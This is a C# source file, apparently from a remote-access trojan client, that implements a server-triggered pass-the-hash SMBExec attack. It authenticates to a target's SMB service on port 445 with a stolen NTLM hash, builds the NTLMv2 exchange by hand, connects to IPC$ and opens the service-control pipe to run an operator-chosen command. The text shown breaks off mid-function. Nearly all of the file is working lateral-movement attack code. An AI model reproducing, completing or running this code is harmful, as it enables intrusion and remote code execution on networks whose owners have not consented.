using System;
using System.Net;
using System.Threading;
using System.Security.Cryptography;
using System.Diagnostics;
using System.Net.Sockets;
using System.Collections.Specialized;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Collections;
using xClient.Core.Helper;
using xClient.Core.Networking;
using xClient.Core.Utilities;

namespace xClient.Core.Commands
{
    public static partial class CommandHandler
    {
        public static void HandleGetSMBExec(Packets.ServerPackets.DoSMBExec args, Client client)
        {
            new Thread(() =>
            {
                //User Set
                string target = args.target;
                string username = args.username;
                string domain = args.domain;
                string command = args.command;
                string SMB_version = "";
                string hash = args.hash;
                string service = args.service;
                bool SMB1 = args.smb1;
                bool commandCOMSPEC = args.comspec;
                int sleep = args.sleep;

                //Trackers
                bool login_successful = false;
                bool SMBExec_failed = false;
                bool SMB_execute = false;
                bool SMB_signing = false;
                string output_username;
                string processID;
                int SMB2_message_ID = 0;
                int SMB_close_service_handle_stage = 0;
                int SMB_split_stage = 0;
                int SMB_split_index_tracker = 0;
                double SMB_split_stage_final = 0;


                //Communication
                byte[] SMBClientReceive = null;

                //Packet Reqs
                byte[] SMB_session_ID = null;
                byte[] session_key = null;
                byte[] SMB_session_key_length = null;
                byte[] SMB_negotiate_flags = null;
                byte[] SMB2_tree_ID = null;
                byte[] SMB_client_send = null;
                byte[] SMB_FID = new byte[2];
                byte[] SMB_service_manager_context_handle = null;
                byte[] SCM_data = null;
                byte[] SMB_service_context_handle = null;
                byte[] SMB_named_pipe_bytes = null;
                byte[] SMB_file_ID = null;
                byte[] SMB_user_ID = null;
                OrderedDictionary packet_SMB_header = null;
                OrderedDictionary packet_SMB2_header = null;
                System.Windows.Forms.MessageBox.Show("target: "+ target + "\nusername: " + username + "\ndomain: " + domain + "\ncommand: " + command + "\nSMB_Version: " + SMB_version + "\nhash: " + hash + "\nservice: " + service);
                if (!string.IsNullOrEmpty(command))
                {
                    SMB_execute = true;
                }

                if (SMB1)
                {
                    SMB_version = "SMB1";
                }

                if (!string.IsNullOrEmpty(hash))
                {
                    if (hash.Contains(":"))
                    {
                        hash = hash.Split(':').Last();
                    }
                }

                if (!string.IsNullOrEmpty(domain))
                {
                    output_username = domain + '\\' + username;
                }
                else
                {
                    output_username = username;
                }
                processID = Process.GetCurrentProcess().Id.ToString();
                byte[] process_ID_Bytes = BitConverter.GetBytes(int.Parse(processID));
                processID = BitConverter.ToString(process_ID_Bytes);
                processID = processID.Replace("-00-00", "").Replace("-", "");
                process_ID_Bytes = PTHSMBExecHelper.StringToByteArray(processID);
                TcpClient SMBClient = new TcpClient();
                SMBClient.Client.ReceiveTimeout = 60000;
                try
                {
                    SMBClient.Connect(target, 445);
                }
                catch
                {
                    new Packets.ClientPackets.DoSMBExecResponse("Execution Failed: Couldn't Connect", false).Execute(client);

                    //Todo Send packet failure.

                }

                if (SMBClient.Connected)
                {
                    System.Windows.Forms.MessageBox.Show("Client Connected");
                    NetworkStream SMBClientStream = SMBClient.GetStream();
                    SMBClientReceive = new byte[1024];
                    string SMBClientStage = "NegotiateSMB";

                    while (SMBClientStage != "exit")
                    {
                        switch (SMBClientStage)
                        {
                            case "NegotiateSMB":
                                {
                                    packet_SMB_header = new OrderedDictionary();
                                    packet_SMB_header = PTHSMBExecHelper.GetPacketSMBHeader(new byte[] { 0x72 }, new byte[] { 0x18 }, new byte[] { 0x01, 0x48 }, new byte[] { 0xff, 0xff }, process_ID_Bytes, new byte[] { 0x00, 0x00 });
                                    OrderedDictionary packet_SMB_data = PTHSMBExecHelper.GetPacketSMBNegotiateProtocolRequest(SMB_version);
                                    byte[] SMB_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                    byte[] SMB_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB_data);
                                    OrderedDictionary packet_NetBIOS_session_service = PTHSMBExecHelper.GetPacketNetBIOSSessionService(SMB_header.Length, SMB_data.Length);
                                    byte[] NetBIOS_session_service = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                                    SMB_client_send = new byte[NetBIOS_session_service.Length + SMB_header.Length + SMB_data.Length];
                                    Buffer.BlockCopy(NetBIOS_session_service, 0, SMB_client_send, 0, NetBIOS_session_service.Length);
                                    Buffer.BlockCopy(SMB_header, 0, SMB_client_send, NetBIOS_session_service.Length, SMB_header.Length);
                                    Buffer.BlockCopy(SMB_data, 0, SMB_client_send, NetBIOS_session_service.Length + SMB_header.Length, SMB_data.Length);
                                    SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                    SMBClientStream.Flush();
                                    SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                    if (BitConverter.ToString(new byte[] { SMBClientReceive[4], SMBClientReceive[5], SMBClientReceive[6], SMBClientReceive[7] }).ToLower() == "ff-53-4d-42")
                                    {
                                        SMB_version = "SMB1";
                                        SMBClientStage = "NTLMSSPNegotiate";
                                        if (BitConverter.ToString(new byte[] { SMBClientReceive[39] }).ToLower() == "0f")
                                        {
                                            SMB_signing = true;
                                            SMB_session_key_length = new byte[] { 0x00, 0x00 };
                                            SMB_negotiate_flags = new byte[] { 0x15, 0x82, 0x08, 0xa0 };

                                        }
                                        else
                                        {
                                            SMB_signing = false;
                                            SMB_session_key_length = new byte[] { 0x00, 0x00 };
                                            SMB_negotiate_flags = new byte[] { 0x05, 0x82, 0x08, 0xa0 };

                                        }
                                    }
                                    else
                                    {
                                        SMBClientStage = "NegotiateSMB2";
                                        if (BitConverter.ToString(new byte[] { SMBClientReceive[70] }) == "03")
                                        {
                                            SMB_signing = true;
                                            SMB_session_key_length = new byte[] { 0x00, 0x00 };
                                            SMB_negotiate_flags = new byte[] { 0x15, 0x82, 0x08, 0xa0 };
                                        }
                                        else
                                        {
                                            SMB_signing = false;
                                            SMB_session_key_length = new byte[] { 0x00, 0x00 };
                                            SMB_negotiate_flags = new byte[] { 0x05, 0x80, 0x08, 0xa0 };

                                        }
                                    }
                                }
                                break;
                            case "NegotiateSMB2":
                                {
                                    packet_SMB2_header = new OrderedDictionary();
                                    SMB2_tree_ID = new byte[] { 0x00, 0x00, 0x00, 0x00 };
                                    SMB_session_ID = new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
                                    SMB2_message_ID = 1;
                                    packet_SMB2_header = PTHSMBExecHelper.GetPacketSMB2Header(new byte[] { 0x00, 0x00 }, SMB2_message_ID, SMB2_tree_ID, SMB_session_ID);
                                    OrderedDictionary packet_SMB2_data = PTHSMBExecHelper.GetPacketSMB2NegotiateProtocolRequest();
                                    byte[] SMB2_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                    byte[] SMB2_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB2_data);
                                    OrderedDictionary packet_NetBIOS_session_service = PTHSMBExecHelper.GetPacketNetBIOSSessionService(SMB2_header.Length, SMB2_data.Length);
                                    byte[] NetBIOS_session_service = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                                    SMB_client_send = PTHSMBExecHelper.CombineByteArray(NetBIOS_session_service, SMB2_header);
                                    SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, SMB2_data);
                                    SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                    SMBClientStream.Flush();
                                    SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                    SMBClientStage = "NTLMSSPNegotiate";

                                }
                                break;
                            case "NTLMSSPNegotiate":
                                {
                                    SMB_client_send = null;
                                    if (SMB_version == "SMB1")
                                    {
                                        packet_SMB_header = PTHSMBExecHelper.GetPacketSMBHeader(new byte[] { 0x73 }, new byte[] { 0x18 }, new byte[] { 0x07, 0xc8 }, new byte[] { 0xff, 0xff }, process_ID_Bytes, new byte[] { 0x00, 0x00 });

                                        if (SMB_signing)
                                        {
                                            packet_SMB_header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                        }
                                        OrderedDictionary packet_NTLMSSP_negotiate = PTHSMBExecHelper.GetPacketNTLMSSPNegotiate(SMB_negotiate_flags, null);
                                        byte[] SMB_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                        byte[] NTLMSSP_negotiate = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_NTLMSSP_negotiate);
                                        OrderedDictionary packet_SMB_data = PTHSMBExecHelper.GetPacketSMBSessionSetupAndXRequest(NTLMSSP_negotiate);
                                        byte[] SMB_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB_data);
                                        OrderedDictionary packet_NetBIOS_session_service = PTHSMBExecHelper.GetPacketNetBIOSSessionService(SMB_header.Length, SMB_data.Length);
                                        byte[] NetBIOS_session_service = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                                        SMB_client_send = PTHSMBExecHelper.CombineByteArray(NetBIOS_session_service, SMB_header);
                                        SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, SMB_data);
                                    }
                                    else
                                    {
                                        packet_SMB2_header = new OrderedDictionary();
                                        SMB2_message_ID += 1;
                                        packet_SMB2_header = PTHSMBExecHelper.GetPacketSMB2Header(new byte[] { 0x01, 0x00 }, SMB2_message_ID, SMB2_tree_ID, SMB_session_ID);
                                        OrderedDictionary packet_NTLMSSP_negotiate = PTHSMBExecHelper.GetPacketNTLMSSPNegotiate(SMB_negotiate_flags, null);
                                        byte[] SMB2_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                        byte[] NTLMSSP_negotiate = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_NTLMSSP_negotiate);
                                        OrderedDictionary packet_SMB2_data = PTHSMBExecHelper.GetPacketSMB2SessionSetupRequest(NTLMSSP_negotiate);
                                        byte[] SMB2_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB2_data);
                                        OrderedDictionary packet_NetBIOS_session_service = PTHSMBExecHelper.GetPacketNetBIOSSessionService(SMB2_header.Length, SMB2_data.Length);
                                        byte[] NetBIOS_session_service = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                                        SMB_client_send = PTHSMBExecHelper.CombineByteArray(NetBIOS_session_service, SMB2_header);
                                        SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, SMB2_data);

                                    }
                                    SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                    SMBClientStream.Flush();
                                    SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                    SMBClientStage = "exit";
                                }
                                break;

                        }
                    }
                    string SMB_NTLSSP = BitConverter.ToString(SMBClientReceive);
                    SMB_NTLSSP = SMB_NTLSSP.Replace("-", "");
                    int SMB_NTLMSSP_Index = SMB_NTLSSP.IndexOf("4E544C4D53535000");
                    int SMB_NTLMSSP_bytes_index = SMB_NTLMSSP_Index / 2;
                    int SMB_domain_length = PTHSMBExecHelper.DataLength2(SMB_NTLMSSP_bytes_index + 12, SMBClientReceive);
                    int SMB_target_length = PTHSMBExecHelper.DataLength2(SMB_NTLMSSP_bytes_index + 40, SMBClientReceive);
                    SMB_session_ID = PTHSMBExecHelper.getByteRange(SMBClientReceive, 44, 51);
                    byte[] SMB_NTLM_challenge = PTHSMBExecHelper.getByteRange(SMBClientReceive, SMB_NTLMSSP_bytes_index + 24, SMB_NTLMSSP_bytes_index + 31);
                    byte[] SMB_target_details = null;
                    SMB_target_details = PTHSMBExecHelper.getByteRange(SMBClientReceive, (SMB_NTLMSSP_bytes_index + 56 + SMB_domain_length), (SMB_NTLMSSP_bytes_index + 55 + SMB_domain_length + SMB_target_length));
                    byte[] SMB_target_time_bytes = PTHSMBExecHelper.getByteRange(SMB_target_details, SMB_target_details.Length - 12, SMB_target_details.Length - 5);
                    string hash2 = "";
                    for (int i = 0; i < hash.Length - 1; i += 2) { hash2 += (hash.Substring(i, 2) + "-"); };
                    byte[] NTLM_hash_bytes = (PTHSMBExecHelper.StringToByteArray(hash.Replace("-", "")));
                    string[] hash_string_array = hash2.Split('-');
                    string auth_hostname = Environment.MachineName;
                    byte[] auth_hostname_bytes = Encoding.Unicode.GetBytes(auth_hostname);
                    byte[] auth_domain_bytes = Encoding.Unicode.GetBytes(domain);
                    byte[] auth_username_bytes = Encoding.Unicode.GetBytes(username);
                    byte[] auth_domain_length = BitConverter.GetBytes(auth_domain_bytes.Length);
                    auth_domain_length = new byte[] { auth_domain_length[0], auth_domain_length[1] };
                    byte[] auth_username_length = BitConverter.GetBytes(auth_username_bytes.Length);
                    auth_username_length = new byte[] { auth_username_length[0], auth_username_length[1] };
                    byte[] auth_hostname_length = BitConverter.GetBytes(auth_hostname_bytes.Length);
                    auth_hostname_length = new byte[] { auth_hostname_length[0], auth_hostname_length[1] };
                    byte[] auth_domain_offset = new byte[] { 0x40, 0x00, 0x00, 0x00 };
                    byte[] auth_username_offset = BitConverter.GetBytes(auth_domain_bytes.Length + 64);
                    byte[] auth_hostname_offset = BitConverter.GetBytes(auth_domain_bytes.Length + auth_username_bytes.Length + 64);
                    byte[] auth_LM_offset = BitConverter.GetBytes(auth_domain_bytes.Length + auth_username_bytes.Length + auth_hostname_bytes.Length + 64);
                    byte[] auth_NTLM_offset = BitConverter.GetBytes(auth_domain_bytes.Length + auth_username_bytes.Length + auth_hostname_bytes.Length + 88);
                    HMACMD5 HMAC_MD5 = new HMACMD5();
                    HMAC_MD5.Key = NTLM_hash_bytes;
                    string username_and_target = username.ToUpper();
                    byte[] username_bytes = Encoding.Unicode.GetBytes(username_and_target);
                    byte[] username_and_target_bytes = null;
                    username_and_target_bytes = PTHSMBExecHelper.CombineByteArray(username_bytes, auth_domain_bytes);
                    byte[] NTLMv2_hash = HMAC_MD5.ComputeHash(username_and_target_bytes);
                    Random r = new Random();
                    byte[] client_challenge_bytes = new byte[8];
                    r.NextBytes(client_challenge_bytes);



                    byte[] security_blob_bytes = null;
                    security_blob_bytes = PTHSMBExecHelper.CombineByteArray(new byte[] { 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }, SMB_target_time_bytes);
                    security_blob_bytes = PTHSMBExecHelper.CombineByteArray(security_blob_bytes, client_challenge_bytes);
                    security_blob_bytes = PTHSMBExecHelper.CombineByteArray(security_blob_bytes, new byte[] { 0x00, 0x00, 0x00, 0x00 });
                    security_blob_bytes = PTHSMBExecHelper.CombineByteArray(security_blob_bytes, SMB_target_details);
                    security_blob_bytes = PTHSMBExecHelper.CombineByteArray(security_blob_bytes, new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });

                    byte[] server_challenge_and_security_blob_bytes = PTHSMBExecHelper.CombineByteArray(SMB_NTLM_challenge, security_blob_bytes);
                    HMAC_MD5.Key = NTLMv2_hash;
                    byte[] NTLMv2_response = HMAC_MD5.ComputeHash(server_challenge_and_security_blob_bytes);
                    if (SMB_signing)
                    {
                        byte[] session_base_key = HMAC_MD5.ComputeHash(NTLMv2_response);
                        session_key = session_base_key;
                        HMACSHA256 HMAC_SHA256 = new HMACSHA256();
                        HMAC_SHA256.Key = session_key;
                    }

                    NTLMv2_response = PTHSMBExecHelper.CombineByteArray(NTLMv2_response, security_blob_bytes);
                    byte[] NTLMv2_response_length = BitConverter.GetBytes(NTLMv2_response.Length);
                    NTLMv2_response_length = new byte[] { NTLMv2_response_length[0], NTLMv2_response_length[1] };
                    byte[] SMB_session_key_offset = BitConverter.GetBytes(auth_domain_bytes.Length + auth_username_bytes.Length + auth_hostname_bytes.Length + NTLMv2_response.Length + 88);
                    byte[] NTLMSSP_response = null;
                    NTLMSSP_response = PTHSMBExecHelper.CombineByteArray(new byte[] { 0x4e, 0x54, 0x4c, 0x4d, 0x53, 0x53, 0x50, 0x00, 0x03, 0x00, 0x00, 0x00, 0x18, 0x00, 0x18, 0x00 }, auth_LM_offset);
                    NTLMSSP_response = PTHSMBExecHelper.CombineByteArray(NTLMSSP_response, NTLMv2_response_length);
                    NTLMSSP_response = PTHSMBExecHelper.CombineByteArray(NTLMSSP_response, NTLMv2_response_length);
                    NTLMSSP_response = PTHSMBExecHelper.CombineByteArray(NTLMSSP_response, auth_NTLM_offset);
                    NTLMSSP_response = PTHSMBExecHelper.CombineByteArray(NTLMSSP_response, auth_domain_length);
                    NTLMSSP_response = PTHSMBExecHelper.CombineByteArray(NTLMSSP_response, auth_domain_length);
                    NTLMSSP_response = PTHSMBExecHelper.CombineByteArray(NTLMSSP_response, auth_domain_offset);
                    NTLMSSP_response = PTHSMBExecHelper.CombineByteArray(NTLMSSP_response, auth_username_length);
                    NTLMSSP_response = PTHSMBExecHelper.CombineByteArray(NTLMSSP_response, auth_username_length);
                    NTLMSSP_response = PTHSMBExecHelper.CombineByteArray(NTLMSSP_response, auth_username_offset);
                    NTLMSSP_response = PTHSMBExecHelper.CombineByteArray(NTLMSSP_response, auth_hostname_length);
                    NTLMSSP_response = PTHSMBExecHelper.CombineByteArray(NTLMSSP_response, auth_hostname_length);
                    NTLMSSP_response = PTHSMBExecHelper.CombineByteArray(NTLMSSP_response, auth_hostname_offset);
                    NTLMSSP_response = PTHSMBExecHelper.CombineByteArray(NTLMSSP_response, SMB_session_key_length);
                    NTLMSSP_response = PTHSMBExecHelper.CombineByteArray(NTLMSSP_response, SMB_session_key_length);
                    NTLMSSP_response = PTHSMBExecHelper.CombineByteArray(NTLMSSP_response, SMB_session_key_offset);
                    NTLMSSP_response = PTHSMBExecHelper.CombineByteArray(NTLMSSP_response, SMB_negotiate_flags);
                    NTLMSSP_response = PTHSMBExecHelper.CombineByteArray(NTLMSSP_response, auth_domain_bytes);
                    NTLMSSP_response = PTHSMBExecHelper.CombineByteArray(NTLMSSP_response, auth_username_bytes);
                    NTLMSSP_response = PTHSMBExecHelper.CombineByteArray(NTLMSSP_response, auth_hostname_bytes);
                    NTLMSSP_response = PTHSMBExecHelper.CombineByteArray(NTLMSSP_response, new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
                    NTLMSSP_response = PTHSMBExecHelper.CombineByteArray(NTLMSSP_response, NTLMv2_response);


                    if (SMB_version == "SMB1")
                    {
                        packet_SMB_header = new OrderedDictionary();
                        SMB_user_ID = new byte[] { SMBClientReceive[32], SMBClientReceive[33] };
                        packet_SMB_header = PTHSMBExecHelper.GetPacketSMBHeader(new byte[] { 0x73 }, new byte[] { 0x18 }, new byte[] { 0x07, 0xc8 }, new byte[] { 0xff, 0xff }, process_ID_Bytes, SMB_user_ID);

                        if (SMB_signing)
                        {
                            packet_SMB_header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                        }

                        packet_SMB_header["SMBHeader_UserID"] = SMB_user_ID;
                        OrderedDictionary packet_NTLMSSP_negotiate = PTHSMBExecHelper.GetPacketNTLMSSPAuth(NTLMSSP_response);
                        byte[] SMB_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                        byte[] NTLMSSP_negotiate = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_NTLMSSP_negotiate);
                        OrderedDictionary packet_SMB_data = PTHSMBExecHelper.GetPacketSMBSessionSetupAndXRequest(NTLMSSP_negotiate);
                        byte[] SMB_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB_data);
                        OrderedDictionary packet_NetBIOS_session_service = PTHSMBExecHelper.GetPacketNetBIOSSessionService(SMB_header.Length, SMB_data.Length);
                        byte[] NetBIOS_session_service = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                        SMB_client_send = PTHSMBExecHelper.CombineByteArray(NetBIOS_session_service, SMB_header);
                        SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, SMB_data);

                    }
                    else
                    {
                        SMB2_message_ID += 1;
                        packet_SMB2_header = PTHSMBExecHelper.GetPacketSMB2Header(new byte[] { 0x01, 0x00 }, SMB2_message_ID, SMB2_tree_ID, SMB_session_ID);
                        OrderedDictionary packet_NTLMSSP_auth = PTHSMBExecHelper.GetPacketNTLMSSPAuth(NTLMSSP_response);
                        byte[] SMB2_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                        byte[] NTLMSSP_auth = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_NTLMSSP_auth);
                        OrderedDictionary packet_SMB2_data = PTHSMBExecHelper.GetPacketSMB2SessionSetupRequest(NTLMSSP_auth);
                        byte[] SMB2_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB2_data);
                        OrderedDictionary packet_NetBIOS_session_service = PTHSMBExecHelper.GetPacketNetBIOSSessionService(SMB2_header.Length, SMB2_data.Length);
                        byte[] NetBIOS_session_service = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                        SMB_client_send = PTHSMBExecHelper.CombineByteArray(NetBIOS_session_service, SMB2_header);
                        SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, SMB2_data);
                    }



                    SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                    SMBClientStream.Flush();
                    SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);

                    if (SMB_version == "SMB1")
                    {
                        if (BitConverter.ToString(PTHSMBExecHelper.getByteRange(SMBClientReceive, 9, 12)) == "00-00-00-00")
                        {
                            login_successful = true;
                        }
                        else
                        {
                            //TODO Send packet failure
                            new Packets.ClientPackets.DoSMBExecResponse("Execution Failed: Authentication Failed", false).Execute(client);
                            login_successful = false;
                        }
                    }
                    else
                    {
                        if (BitConverter.ToString(PTHSMBExecHelper.getByteRange(SMBClientReceive, 12, 15)) == "00-00-00-00")
                        {
                            login_successful = true;
                        }
                        else
                        {
                            new Packets.ClientPackets.DoSMBExecResponse("Execution Failed: Authentication Failed", false).Execute(client);
                            login_successful = false;
                            //TODO Send packet failure
                        }
                    }


                    if (login_successful)
                    {
                        byte[] SMBExec_command;
                        byte[] SMB_path_bytes;
                        string SMB_Path = "\\\\" + target + "\\IPC$";
                        if (SMB_version == "SMB1")
                        {
                            SMB_path_bytes = PTHSMBExecHelper.CombineByteArray(Encoding.UTF8.GetBytes(SMB_Path), new byte[] { 0x00 });
                        }
                        else
                        {
                            SMB_path_bytes = Encoding.Unicode.GetBytes(SMB_Path);
                        }

                        byte[] SMB_named_pipe_UUID = { 0x81, 0xbb, 0x7a, 0x36, 0x44, 0x98, 0xf1, 0x35, 0xad, 0x32, 0x98, 0xf0, 0x38, 0x00, 0x10, 0x03 };
                        byte[] SMB_service_bytes;
                        string SMB_service = null;
                        if (string.IsNullOrEmpty(service))
                        {
                            //Generate 20 char random string 
                            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
                            var rand = new Random();
                            SMB_service = new string(Enumerable.Repeat(chars, 20).Select(s => s[rand.Next(s.Length)]).ToArray());
                            SMB_service_bytes = Encoding.Unicode.GetBytes(SMB_service);
                            SMB_service_bytes = PTHSMBExecHelper.CombineByteArray(SMB_service_bytes, new byte[] { 0x00, 0x00, 0x00, 0x00 });
                        }
                        else
                        {
                            SMB_service = service;
                            SMB_service_bytes = Encoding.Unicode.GetBytes(SMB_service);
                            if (Convert.ToBoolean(SMB_service.Length % 2))
                            {
                                SMB_service_bytes = PTHSMBExecHelper.CombineByteArray(SMB_service_bytes, new byte[] { 0x00, 0x00 });
                            }
                            else
                            {
                                SMB_service_bytes = PTHSMBExecHelper.CombineByteArray(SMB_service_bytes, new byte[] { 0x00, 0x00, 0x00, 0x00 });
                            }
                        }

                        byte[] SMB_service_length = BitConverter.GetBytes(SMB_service.Length + 1);

                        if (commandCOMSPEC)
                        {
                            command = "%COMPSEC% /C \"" + command + "\"";
                        }
                        else
                        {
                            command = "\"" + command + "\"";
                        }

                        byte[] commandBytes = Encoding.UTF8.GetBytes(command);
                        List<byte> SMBExec_command_list = new List<byte>();
                        foreach (byte commandByte in commandBytes)
                        {
                            SMBExec_command_list.Add(commandByte);
                            SMBExec_command_list.Add(0x00);

                        }
                        byte[] SMBExec_command_init = SMBExec_command_list.ToArray();
                        if (Convert.ToBoolean(command.Length % 2))
                        {
                            SMBExec_command = PTHSMBExecHelper.CombineByteArray(SMBExec_command_init, new byte[] { 0x00, 0x00 });
                        }
                        else
                        {
                            SMBExec_command = PTHSMBExecHelper.CombineByteArray(SMBExec_command_init, new byte[] { 0x00, 0x00, 0x00, 0x00 });
                        }
                        byte[] SMBExec_command_length_bytes = BitConverter.GetBytes(SMBExec_command.Length / 2);
                        int SMB_split_index = 4256;
                        int SMB_signing_counter = 0;
                        byte[] SMB_tree_ID = new byte[2];
                        string SMB_client_stage_next = "";

                        if (SMB_version == "SMB1")
                        {
                            SMBClientStage = "TreeConnectAndXRequest";
                            while (SMBClientStage != "exit" && SMBExec_failed == false)
                            {
                                switch (SMBClientStage)
                                {
                                    case "TreeConnectAndXRequest":
                                        {
                                            packet_SMB_header = new OrderedDictionary();
                                            packet_SMB_header = PTHSMBExecHelper.GetPacketSMBHeader(new byte[] { 0x75 }, new byte[] { 0x18 }, new byte[] { 0x01, 0x48 }, new byte[] { 0xff, 0xff }, process_ID_Bytes, SMB_user_ID);
                                            if (SMB_signing)
                                            {
                                                packet_SMB_header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                                SMB_signing_counter = 2;
                                                byte[] SMB_signing_sequence = PTHSMBExecHelper.CombineByteArray(BitConverter.GetBytes(SMB_signing_counter), new byte[] { 0x00, 0x00, 0x00, 0x00 });
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_signing_sequence;
                                            }
                                            byte[] SMB_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            OrderedDictionary packet_SMB_data = PTHSMBExecHelper.GetPacketSMBTreeConnectAndXRequest(SMB_path_bytes);
                                            byte[] SMB_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB_data);
                                            OrderedDictionary packet_NetBIOS_Session_service = PTHSMBExecHelper.GetPacketNetBIOSSessionService(SMB_header.Length, SMB_data.Length);
                                            byte[] NetBIOS_Session_service = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_NetBIOS_Session_service);

                                            if (SMB_signing)
                                            {
                                                MD5CryptoServiceProvider MD5Crypto = new MD5CryptoServiceProvider();
                                                byte[] SMB_Sign = PTHSMBExecHelper.CombineByteArray(session_key, SMB_header);
                                                byte[] SMB_Sign2 = PTHSMBExecHelper.CombineByteArray(SMB_Sign, SMB_data);
                                                byte[] SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign2);
                                                byte[] SMB_Signature2 = PTHSMBExecHelper.getByteRange(SMB_Signature, 0, 7);
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_Signature2;
                                                SMB_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            }
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(NetBIOS_Session_service, SMB_header);
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, SMB_data);


                                            SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                            SMBClientStream.Flush();
                                            SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                            SMBClientStage = "CreateAndXRequest";
                                        }
                                        break;
                                    case "CreateAndXRequest":
                                        {
                                            SMB_named_pipe_bytes = new byte[] { 0x5c, 0x73, 0x76, 0x63, 0x63, 0x74, 0x6c, 0x00 };
                                            SMB_tree_ID = PTHSMBExecHelper.getByteRange(SMBClientReceive, 28, 29);
                                            packet_SMB_header = PTHSMBExecHelper.GetPacketSMBHeader(new byte[] { 0xa2 }, new byte[] { 0x18 }, new byte[] { 0x02, 0x28 }, SMB_tree_ID, process_ID_Bytes, SMB_user_ID);
                                            if (SMB_signing)
                                            {
                                                packet_SMB_header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                                SMB_signing_counter += 2;
                                                byte[] SMB_signing_sequence = PTHSMBExecHelper.CombineByteArray(BitConverter.GetBytes(SMB_signing_counter), new byte[] { 0x00, 0x00, 0x00, 0x00 });
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_signing_sequence;
                                            }
                                            byte[] SMB_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            OrderedDictionary packet_SMB_data = PTHSMBExecHelper.GetPacketSMBNTCreateAndXRequest(SMB_named_pipe_bytes);
                                            byte[] SMB_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB_data);
                                            OrderedDictionary packet_NetBIOS_Session_service = PTHSMBExecHelper.GetPacketNetBIOSSessionService(SMB_header.Length, SMB_data.Length);
                                            byte[] NetBIOS_Session_service = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_NetBIOS_Session_service);

                                            if (SMB_signing)
                                            {
                                                MD5CryptoServiceProvider MD5Crypto = new MD5CryptoServiceProvider();
                                                byte[] SMB_Sign = PTHSMBExecHelper.CombineByteArray(session_key, SMB_header);
                                                byte[] SMB_Sign2 = PTHSMBExecHelper.CombineByteArray(SMB_Sign, SMB_data);
                                                byte[] SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign2);
                                                byte[] SMB_Signature2 = PTHSMBExecHelper.getByteRange(SMB_Signature, 0, 7);
